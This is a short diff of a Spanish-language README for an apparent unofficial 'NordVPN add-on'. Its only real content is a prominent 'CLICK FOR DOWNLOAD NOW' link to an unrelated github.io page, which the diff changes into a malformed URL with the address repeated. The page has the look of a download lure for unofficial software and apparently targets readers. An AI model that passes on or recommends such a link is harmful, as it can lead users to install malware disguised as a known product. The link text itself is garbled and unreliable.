@@ -4,7 +4,7 @@ Alta Velocidad NordVPN Complemento | protección contra fugas de DNS + cambio de
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( https://foundtailorthink.github.io/nordvpn-fl81/) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( https://foundtailorthink.github.io/nordvpn-fl81/https://foundtailorthink.github.io/nordvpn-fl81/) |
  |---------------------|----------------------:|
 
 
